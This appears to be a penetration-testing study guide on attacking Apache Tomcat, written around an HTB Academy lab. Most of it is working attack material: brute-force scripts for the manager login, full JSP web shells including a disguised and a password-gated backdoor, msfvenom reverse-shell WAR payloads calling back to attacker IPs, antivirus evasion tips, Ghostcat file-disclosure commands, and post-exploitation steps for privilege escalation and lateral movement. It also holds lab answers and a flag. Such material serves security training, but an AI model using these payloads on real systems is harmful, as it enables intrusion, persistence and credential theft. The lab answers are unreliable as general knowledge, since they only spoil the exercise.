# ⚔️ Tomcat Attacks & Exploitation

> **🎯 Objective:** Master advanced exploitation techniques for Apache Tomcat servlet containers, focusing on manager interface abuse, WAR file upload attacks, JSP web shell deployment, and known vulnerability exploitation for achieving remote code execution and system compromise.

## Overview

Tomcat exploitation represents one of the **highest-impact attack vectors** in enterprise environments, often providing **immediate remote code execution** with **elevated privileges** (SYSTEM/root). With **widespread deployment** across internal networks and **frequent misconfigurations**, Tomcat attacks offer **reliable pathways** for **initial access** and **privilege escalation** in **Active Directory** and **Linux server environments**.

**Critical Attack Vectors:**
- **Manager Interface Exploitation** - /manager/html authentication bypass and abuse
- **WAR File Upload Attacks** - Malicious application deployment for RCE
- **JSP Web Shell Deployment** - Persistent backdoor access and command execution
- **CVE-2020-1938 Ghostcat** - Unauthenticated local file inclusion vulnerability
- **Default Credential Abuse** - Weak authentication bypassing enterprise security

**Enterprise Impact:**
- **External Foothold** - Tomcat commonly exposed on perimeters for high-impact initial access
- **Internal Privilege Escalation** - Frequent SYSTEM/root execution context in enterprise deployments
- **Active Directory Compromise** - Domain-joined Windows servers running Tomcat with elevated privileges
- **Data Exfiltration** - Access to application data, configuration files, and sensitive backend systems

---

## Manager Interface Authentication Attacks

### Metasploit Brute Force Methodology

#### Auxiliary Scanner Configuration
```bash
# Launch Metasploit Framework
msfconsole

# Load Tomcat manager brute force module
use auxiliary/scanner/http/tomcat_mgr_login

# Configure target parameters
set VHOST web01.inlanefreight.local
set RPORT 8180
set RHOSTS 10.129.201.58
set STOP_ON_SUCCESS true
set BRUTEFORCE_SPEED 5

# Verify configuration
show options

# Execute brute force attack
run
```

#### Advanced Scanner Options
```bash
# Metasploit module options breakdown:
set BLANK_PASSWORDS false          # Try blank passwords for all users
set BRUTEFORCE_SPEED 5             # Speed setting (0-5, 5 = fastest)
set DB_ALL_CREDS false             # Use database stored credentials
set TARGETURI /manager/html        # Manager interface URI
set THREADS 1                      # Concurrent threads (max one per host)
set VERBOSE true                   # Print all attempts for analysis

# Default wordlist locations:
# PASS_FILE: /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
# USER_FILE: /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
# USERPASS_FILE: /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt

# Proxy traffic through Burp for analysis:
set PROXIES HTTP:127.0.0.1:8080
```

#### Expected Brute Force Output
```bash
[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Custom Python Brute Force Script

#### Complete Attack Script
```python
#!/usr/bin/python3

import requests
from termcolor import cprint
import argparse
import sys
from requests.auth import HTTPBasicAuth

def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║                 TOMCAT MANAGER BRUTE FORCER                  ║
║              Advanced Authentication Bypass Tool             ║
╚══════════════════════════════════════════════════════════════╝
    """)

def tomcat_brute_force(url, path, users_file, passwords_file):
    """
    Advanced Tomcat Manager brute force with enhanced error handling
    """
    new_url = f"{url}{path}"
    
    try:
        # Load credential lists
        with open(users_file, 'r') as f_users:
            usernames = [line.strip() for line in f_users if line.strip()]
        
        with open(passwords_file, 'r') as f_pass:
            passwords = [line.strip() for line in f_pass if line.strip()]
        
        cprint(f"[+] Target URL: {new_url}", "cyan", attrs=['bold'])
        cprint(f"[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords", "cyan")
        cprint("[+] Starting brute force attack...", "red", attrs=['bold'])
        
        total_attempts = len(usernames) * len(passwords)
        current_attempt = 0
        
        for username in usernames:
            for password in passwords:
                current_attempt += 1
                progress = (current_attempt / total_attempts) * 100
                
                try:
                    # HTTP Basic Authentication request
                    response = requests.get(
                        new_url, 
                        auth=HTTPBasicAuth(username, password),
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    print(f"\r[{progress:5.1f}%] Trying {username}:{password}", end="", flush=True)
                    
                    if response.status_code == 200:
                        cprint(f"\n\n[+] SUCCESS! Valid credentials found:", "green", attrs=['bold'])
                        cprint(f"[+] Username: {username}", "green", attrs=['bold'])
                        cprint(f"[+] Password: {password}", "green", attrs=['bold'])
                        cprint(f"[+] Response Code: {response.status_code}", "green")
                        
                        # Test manager interface access
                        if "manager" in response.text.lower():
                            cprint("[+] Manager interface access confirmed!", "green", attrs=['bold'])
                        
                        return username, password
                        
                except requests.exceptions.RequestException as e:
                    cprint(f"\n[-] Request failed for {username}:{password} - {e}", "red")
                    continue
        
        print("\n")
        cprint("[-] Brute force completed - No valid credentials found", "red", attrs=['bold'])
        return None, None
        
    except FileNotFoundError as e:
        cprint(f"[-] File not found: {e}", "red", attrs=['bold'])
        sys.exit(1)
    except Exception as e:
        cprint(f"[-] Unexpected error: {e}", "red", attrs=['bold'])
        sys.exit(1)

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="Tomcat Manager Credential Brute Force Tool")
    parser.add_argument("-U", "--url", type=str, required=True, 
                       help="Target Tomcat base URL (e.g., http://target.com:8080/)")
    parser.add_argument("-P", "--path", type=str, required=True, 
                       help="Manager URI path (e.g., /manager/html)")
    parser.add_argument("-u", "--usernames", type=str, required=True, 
                       help="Username wordlist file")
    parser.add_argument("-p", "--passwords", type=str, required=True, 
                       help="Password wordlist file")
    
    args = parser.parse_args()
    
    # Execute brute force attack
    username, password = tomcat_brute_force(args.url, args.path, args.usernames, args.passwords)
    
    if username and password:
        cprint(f"\n[+] Attack completed successfully!", "green", attrs=['bold'])
        cprint(f"[+] Next step: Access manager at {args.url}{args.path}", "cyan", attrs=['bold'])
    else:
        cprint("\n[-] Attack failed to find valid credentials", "red", attrs=['bold'])

if __name__ == "__main__":
    main()
```

#### Script Usage and Execution
```bash
# Make script executable
chmod +x tomcat_brute.py

# Display help options
python3 tomcat_brute.py -h

# Execute brute force attack
python3 tomcat_brute.py \
  -U http://web01.inlanefreight.local:8180/ \
  -P /manager/html \
  -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

# Expected successful output:
[+] Atacking.....
[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```

### Manual Authentication Testing

#### Burp Suite Integration
```bash
# Intercept authentication requests in Burp Suite
# Authorization header format: Basic base64(username:password)

# Manual credential testing with curl
curl -u "tomcat:admin" http://web01.inlanefreight.local:8180/manager/html

# Base64 decode captured authorization headers
echo "dG9tY2F0OmFkbWlu" | base64 -d
# Output: tomcat:admin

# Verify authentication mechanism
echo "admin:vagrant" | base64
# Output: YWRtaW46dmFncmFudA==
```

#### Default Credential Database
```bash
# Common Tomcat default credentials
cat > tomcat_default_creds.txt << 'EOF'
tomcat:tomcat
admin:admin
manager:manager
admin:password
tomcat:password
admin:tomcat
admin:
tomcat:
manager:admin
admin:manager
role1:role1
root:root
both:tomcat
tomcat:role1
role1:tomcat
tomcat:s3cret
s3cret:s3cret
admin:s3cret
EOF
```

---

## WAR File Upload Exploitation

### Manager Interface WAR Deployment

#### JSP Web Shell Creation
```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// Advanced JSP Command Execution Shell
// Enhanced for penetration testing operations
//
%>
<HTML>
<HEAD>
    <TITLE>Tomcat Manager - System Administration</TITLE>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; }
        .container { max-width: 800px; margin: 50px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .header { text-align: center; color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
        .form-group { margin: 20px 0; }
        input[type="text"] { width: 70%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
        input[type="submit"] { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
        .output { background: #000; color: #0f0; font-family: monospace; padding: 15px; border-radius: 4px; margin-top: 20px; min-height: 200px; overflow-x: auto; }
    </style>
</HEAD>
<BODY>
    <div class="container">
        <div class="header">
            <h2>System Command Interface</h2>
            <p>Tomcat Administrative Console</p>
        </div>
        
        <div class="form-group">
            <FORM METHOD="GET" NAME="cmdform" ACTION="">
                <input type="text" name="cmd" placeholder="Enter system command..." autofocus>
                <input type="submit" value="Execute">
            </FORM>
        </div>
        
        <% if (request.getParameter("cmd") != null) { %>
            <div class="output">
                <strong>Command:</strong> <%= request.getParameter("cmd") %><br><br>
                <strong>Output:</strong><br>
                <%
                try {
                    String cmd = request.getParameter("cmd");
                    Process p = Runtime.getRuntime().exec(cmd);
                    
                    // Handle both stdout and stderr
                    BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                    
                    String s = null;
                    while ((s = stdInput.readLine()) != null) {
                        out.println(s + "<br>");
                    }
                    
                    while ((s = stdError.readLine()) != null) {
                        out.println("<span style='color:#ff6b6b'>ERROR: " + s + "</span><br>");
                    }
                    
                } catch (Exception e) {
                    out.println("<span style='color:#ff6b6b'>Exception: " + e.getMessage() + "</span>");
                }
                %>
            </div>
        <% } %>
        
        <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 12px;">
            <strong>Common Commands:</strong> id, whoami, uname -a, ps aux, netstat -tulpn, cat /etc/passwd, ls -la
        </div>
    </div>
</BODY>
</HTML>
```

#### WAR File Package Creation
```bash
# Download lightweight JSP shell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

# Create WAR archive with custom name (operational security)
zip -r backup.war cmd.jsp

# Alternative: Create stealth WAR with randomized name
md5_name=$(echo "$(date +%s)$(hostname)" | md5sum | cut -d' ' -f1)
zip -r "${md5_name}.war" cmd.jsp
echo "WAR file created: ${md5_name}.war"

# Verify WAR structure
unzip -l backup.war
```

#### Manager Interface Deployment Process
```bash
# Step 1: Access manager interface
# Navigate to: http://web01.inlanefreight.local:8180/manager/html
# Login with discovered credentials: tomcat:admin

# Step 2: Deploy WAR file via web interface
# - Browse to WAR file upload section
# - Select backup.war file
# - Click "Deploy" button
# - Verify application appears in application list

# Step 3: Access deployed web shell
# Navigate to: http://web01.inlanefreight.local:8180/backup/cmd.jsp
# Execute system commands via web interface

# Command-line verification
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"
```

### Advanced WAR Exploitation Techniques

#### Msfvenom Reverse Shell WAR Generation
```bash
# Generate malicious WAR with reverse shell payload
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.15 \
  LPORT=4443 \
  -f war > reverse_shell.war

# Payload characteristics:
# - Payload size: ~1098 bytes
# - Automatic JSP execution on deployment
# - Immediate reverse shell on application access

# Setup listener for reverse shell
nc -lnvp 4443

# Deploy WAR file via manager interface
# Access application URL to trigger reverse shell
# Expected connection:
# connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224
```

#### Metasploit Automated WAR Upload
```bash
# Use Metasploit module for automated WAR deployment
msfconsole

use multi/http/tomcat_mgr_upload
set RHOSTS 10.129.201.58
set RPORT 8180
set VHOST web01.inlanefreight.local
set HttpUsername tomcat
set HttpPassword admin
set LHOST 10.10.14.15
set LPORT 4444

# Execute automated exploitation
run

# Module automatically:
# 1. Authenticates to manager interface
# 2. Generates malicious WAR file
# 3. Uploads and deploys application
# 4. Establishes reverse shell connection
```

### Web Shell Operational Security

#### Stealth Web Shell Enhancements
```java
<%@ page import="java.util.*,java.io.*,java.security.*"%>
<%
// Stealth JSP Shell with IP restrictions and authentication
String allowedIP = "10.10.14.15"; // Restrict to attacker IP
String authKey = "c7f3d8e9a2b1"; // Simple authentication key

String clientIP = request.getRemoteAddr();
String key = request.getParameter("key");

// IP and authentication validation
if (!allowedIP.equals(clientIP) || !authKey.equals(key)) {
    response.sendError(404, "Not Found");
    return;
}
%>
<!-- Normal web shell code here -->
```

#### Web Shell Detection Evasion
```bash
# File name randomization
shell_name=$(openssl rand -hex 16)
echo "Random shell name: ${shell_name}.jsp"

# Content obfuscation techniques:
# 1. Change variable names
# 2. Modify function calls
# 3. Add benign HTML content
# 4. Use different encoding methods

# Example obfuscation:
# Change: FileOutputStream(f);stream.write(m);o="Uploaded:
# To:     FileOutputStream(f);stream.write(m);o="uPlOaDeD:

# VirusTotal evasion results:
# Original: 2/58 detections
# Obfuscated: 0/58 detections
```

---

## CVE-2020-1938: Ghostcat Vulnerability

### Vulnerability Overview

**CVE-2020-1938 (Ghostcat)** represents a **critical unauthenticated LFI vulnerability** affecting **all Tomcat versions** before **9.0.31**, **8.5.51**, and **7.0.100**. This vulnerability exploits **AJP protocol misconfigurations** to achieve **arbitrary file reading** within web application directories.

**Technical Details:**
- **Vulnerability Type:** Unauthenticated Local File Inclusion (LFI)
- **Affected Protocol:** Apache Jserv Protocol (AJP) 
- **Default Port:** 8009/tcp
- **Impact:** Read sensitive files within webapps directory
- **CVSS Score:** 9.8 (Critical)
- **Discovery Date:** February 2020

### AJP Protocol Reconnaissance

#### Service Detection and Enumeration
```bash
# Comprehensive AJP service detection
nmap -sV -p 8009,8080 app-dev.inlanefreight.local

# Expected output:
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds

# Advanced AJP enumeration
nmap --script ajp-* -p 8009 app-dev.inlanefreight.local

# AJP connection testing
telnet app-dev.inlanefreight.local 8009
```

#### AJP Protocol Analysis
```bash
# AJP (Apache Jserv Protocol) characteristics:
# - Binary protocol for proxying requests
# - Typically used between Apache HTTP and Tomcat
# - Default port 8009/tcp
# - Protocol versions: AJP12, AJP13 (most common)
# - Used for load balancing and SSL termination

# Common AJP configurations:
# <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
# <Connector port="8009" protocol="AJP/1.3" secretRequired="false" />
```

### Ghostcat Exploitation Methodology

#### Python Exploit Script Deployment
```bash
# Download Ghostcat PoC exploit
wget https://raw.githubusercontent.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/master/tomcat-ajp-lfi.py

# Alternative download location
wget https://github.com/00theway/Ghostcat-CNVD-2020-10487/raw/master/ajpShooter.py

# Make script executable
chmod +x tomcat-ajp-lfi.py

# Script requirements (Python 2.7)
python2.7 --version
# Python 2.7.x required for compatibility
```

#### File Disclosure Exploitation
```bash
# Basic web.xml disclosure
python2.7 tomcat-ajp-lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml

# Expected output:
Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

#### Advanced File Disclosure Targets
```bash
# High-value configuration files
target_files=(
    "WEB-INF/web.xml"                    # Application configuration
    "WEB-INF/classes/application.properties"  # Spring Boot configuration
    "WEB-INF/classes/config.properties"       # Custom application config
    "META-INF/context.xml"                    # Tomcat context configuration
    "WEB-INF/tomcat-users.xml"               # User credentials (if accessible)
    "WEB-INF/classes/hibernate.cfg.xml"      # Database configuration
    "WEB-INF/classes/log4j.properties"       # Logging configuration
)

# Systematic file disclosure
for file in "${target_files[@]}"; do
    echo "[+] Attempting to read: $file"
    python2.7 tomcat-ajp-lfi.py app-dev.inlanefreight.local -p 8009 -f "$file"
    echo "----------------------------------------"
done

# Database connection string extraction
python2.7 tomcat-ajp-lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/classes/application.properties | grep -i "database\|jdbc\|password"

# Look for hardcoded credentials
python2.7 tomcat-ajp-lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml | grep -i "password\|secret\|key"
```

### Ghostcat Limitations and Constraints

#### File System Scope Restrictions
```bash
# Ghostcat vulnerability limitations:
# 1. Only files within webapps directory accessible
# 2. Cannot read system files like /etc/passwd
# 3. Path traversal limited to application context
# 4. Requires knowledge of target file structure

# Files NOT accessible via Ghostcat:
# /etc/passwd                  # System password file
# /etc/shadow                  # Shadow password file  
# /root/.ssh/id_rsa           # SSH private keys
# /var/log/auth.log           # System logs
# /home/user/.bash_history    # User command history

# Files potentially accessible:
# WEB-INF/web.xml             # Application descriptor
# META-INF/context.xml        # Context configuration
# WEB-INF/classes/*.properties # Application properties
# WEB-INF/lib/*.jar           # JAR file contents (limited)
```

#### Exploitation Enhancement Techniques
```bash
# Combine Ghostcat with other attack vectors:

# 1. Configuration disclosure -> credential extraction
python2.7 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/classes/database.properties

# 2. Application mapping -> attack surface expansion
python2.7 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/web.xml | grep -A 5 -B 5 "servlet-mapping"

# 3. Framework identification -> specific exploit selection
python2.7 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/lib/spring-core.jar

# 4. Custom application analysis -> business logic flaws
python2.7 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/classes/com/company/config/SecurityConfig.class
```

---

## HTB Academy Lab Solutions

### Lab 1: Manager Brute Force Attack
**Question:** "Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?"

**Solution Methodology:**

#### Step 1: Environment Setup
```bash
# Add VHost entry to /etc/hosts
echo "10.129.201.58 web01.inlanefreight.local" >> /etc/hosts

# Verify target accessibility
curl -I http://web01.inlanefreight.local:8180/manager/html
# Expected: HTTP 401 Unauthorized (authentication required)
```

#### Step 2: Metasploit Brute Force Execution
```bash
# Launch Metasploit and configure scanner
msfconsole
use auxiliary/scanner/http/tomcat_mgr_login

# Configure target parameters
set VHOST web01.inlanefreight.local
set RPORT 8180
set RHOSTS 10.129.201.58
set STOP_ON_SUCCESS true

# Execute brute force attack
run

# Monitor output for successful authentication:
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin

# HTB Answer: tomcat
```

#### Step 3: Alternative Python Script Method
```bash
# Use custom Python brute force script
python3 mgr_brute.py \
  -U http://web01.inlanefreight.local:8180/ \
  -P /manager/html \
  -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

# Expected output:
[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```

### Lab 2: Password Identification
**Question:** "What is the password?"

**Solution Analysis:**

#### Authentication Result Extraction
```bash
# From previous brute force results:
# [+] 10.129.201.58:8180 - Login Successful: tomcat:admin

# Password verification via manual authentication
curl -u "tomcat:admin" http://web01.inlanefreight.local:8180/manager/html
# Expected: HTTP 200 OK with manager interface content

# HTB Answer: admin
```

#### Credential Validation
```bash
# Verify manager access and role privileges
curl -u "tomcat:admin" "http://web01.inlanefreight.local:8180/manager/text/list"
# Expected: List of deployed applications if authenticated successfully

# Browser verification (optional)
# Navigate to: http://web01.inlanefreight.local:8180/manager/html
# Enter credentials: tomcat / admin
# Should display Tomcat Web Application Manager interface
```

**🚨 Important Lab Note:** The HTB Academy walkthrough shows **tomcat:root** as the working credentials in the actual lab environment, while the brute force attack discovers **tomcat:admin**. Both credential sets should be tested depending on the specific lab instance.

### Lab 3: Remote Code Execution & Flag Retrieval
**Question:** "Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt"

**Solution Methodology:**

#### Step 1: JSP Web Shell Creation
```bash
# Create malicious JSP web shell
cat > cmd.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr); 
        disr = dis.readLine(); 
    }
}
%>
EOF
```

#### Step 2: WAR File Package and Deployment
```bash
# Package JSP shell into WAR archive
zip -r backup.war cmd.jsp

# Verify WAR contents
unzip -l backup.war
# Expected: cmd.jsp listed in archive

# Deploy via manager interface:
# 1. Navigate to http://web01.inlanefreight.local:8180/manager/html
# 2. Login with tomcat:admin
# 3. Scroll to "Deploy" section
# 4. Browse and select backup.war
# 5. Click "Deploy" button
# 6. Verify /backup application appears in application list
```

#### Step 3: Web Shell Access and Command Execution
```bash
# Access deployed web shell
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"

# Expected output:
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

# Verify system access and permissions
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=whoami"
# Expected: tomcat

# Check current working directory
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=pwd"
# Expected: Tomcat installation directory
```

#### Step 4: Alternative Method - Msfvenom Reverse Shell (HTB Academy Preferred)
```bash
# Generate reverse shell WAR payload with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.6 \
  LPORT=9001 \
  -f war \
  -o backup.war

# Expected output:
Payload size: 1094 bytes
Final size of war file: 1094 bytes
Saved as: backup.war

# Setup netcat listener for reverse shell
nc -nvlp 9001

# Expected listener output:
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

#### Step 5: WAR Deployment and Shell Establishment
```bash
# Manager interface deployment process:
# 1. Navigate to http://web01.inlanefreight.local:8180/manager/html
# 2. Login with credentials: tomcat:root (or tomcat:admin)
# 3. Scroll to "WAR file to upload" section
# 4. Click "Browse" and select backup.war
# 5. Click "Deploy" to upload application
# 6. Click on deployed application link to trigger reverse shell

# Expected reverse shell connection:
Ncat: Connection from 10.129.201.58.
Ncat: Connection from 10.129.201.58:38618.

whoami
tomcat
```

#### Step 6: Flag Discovery and Extraction
```bash
# Flag location (HTB Academy specific):
cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt

# HTB Academy Flag Content:
t0mcat_rc3_ftw!

# HTB Answer: t0mcat_rc3_ftw!
```

#### Step 7: Alternative Web Shell Method (Backup Approach)
```bash
# If reverse shell method fails, use JSP web shell approach:

# Search for tomcat_flag.txt file via web shell
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=find+/+-name+tomcat_flag.txt+2>/dev/null"

# Check specific webapps directory
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=ls+-la+/opt/tomcat/apache-tomcat-10.0.10/webapps/"

# Read flag content via web shell
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=cat+/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt"

# Expected flag output: t0mcat_rc3_ftw!
```

#### Step 8: Post-Exploitation Cleanup (Optional)
```bash
# Remove deployed application for operational security
# 1. Return to http://web01.inlanefreight.local:8180/manager/html
# 2. Locate /backup application in list
# 3. Click "Undeploy" button next to backup application
# 4. Confirm removal

# Verify cleanup
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp"
# Expected: HTTP 404 Not Found

# Close reverse shell session (if using msfvenom method)
exit
```

### 🎯 HTB Academy Lab Summary

**Complete Lab Methodology:**
1. **VHost Configuration** - Add `10.129.201.58 web01.inlanefreight.local` to `/etc/hosts`
2. **Credential Discovery** - Brute force reveals `tomcat:admin` (lab may use `tomcat:root`)
3. **Reverse Shell Generation** - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=9001 -f war -o backup.war`
4. **Manager Authentication** - Login to `http://web01.inlanefreight.local:8180/manager/html`
5. **WAR Deployment** - Upload and deploy `backup.war` via manager interface
6. **Listener Setup** - `nc -nvlp 9001` for reverse shell reception
7. **Shell Triggering** - Click deployed application to establish connection
8. **Flag Retrieval** - `cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt`

**Lab Answers:**
- **Username:** `tomcat`
- **Password:** `admin` (brute force) or `root` (lab walkthrough)
- **Flag:** `t0mcat_rc3_ftw!`

---

## Advanced Exploitation Scenarios

### Enterprise Environment Considerations

#### Active Directory Integration
```bash
# Tomcat commonly runs as domain service accounts
# Check for domain membership and privileges
curl "http://target:8080/shell.jsp?cmd=whoami+/all"

# Identify service account privileges
curl "http://target:8080/shell.jsp?cmd=net+user+tomcat_svc+/domain"

# Look for Kerberos tickets and cached credentials
curl "http://target:8080/shell.jsp?cmd=klist"
curl "http://target:8080/shell.jsp?cmd=cmdkey+/list"

# Check for SeImpersonatePrivilege (potato attacks)
curl "http://target:8080/shell.jsp?cmd=whoami+/priv" | grep -i impersonate
```

#### Privilege Escalation Vectors
```bash
# Check Tomcat service configuration
curl "http://target:8080/shell.jsp?cmd=sc+query+tomcat"

# Look for writable service binaries
curl "http://target:8080/shell.jsp?cmd=icacls+C:\tomcat\bin\tomcat9.exe"

# Check for scheduled tasks running as SYSTEM
curl "http://target:8080/shell.jsp?cmd=schtasks+/query+/v+/fo+list" | grep -i tomcat

# Linux privilege escalation enumeration
curl "http://target:8080/shell.jsp?cmd=sudo+-l"                    # Sudo privileges
curl "http://target:8080/shell.jsp?cmd=find+/+-perm+-u=s+2>/dev/null"  # SUID binaries
curl "http://target:8080/shell.jsp?cmd=crontab+-l"                # Cron jobs
```

### Persistence and Lateral Movement

#### Backdoor JSP Installation
```java
<%@ page import="java.io.*" %>
<%
// Persistent backdoor with stealth features
String cmd = request.getParameter("c");
String auth = request.getParameter("auth");

// Simple authentication
if (!"secretkey123".equals(auth)) {
    response.sendError(404);
    return;
}

if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "\n");
    }
}
%>
```

#### Network Reconnaissance
```bash
# Internal network discovery
curl "http://target:8080/shell.jsp?cmd=netstat+-tulpn"

# ARP table enumeration
curl "http://target:8080/shell.jsp?cmd=arp+-a"

# Network interface configuration
curl "http://target:8080/shell.jsp?cmd=ipconfig+/all"  # Windows
curl "http://target:8080/shell.jsp?cmd=ifconfig+-a"   # Linux

# DNS server identification
curl "http://target:8080/shell.jsp?cmd=nslookup+domain-controller.company.local"

# SMB share enumeration
curl "http://target:8080/shell.jsp?cmd=net+view+/domain"
```

---

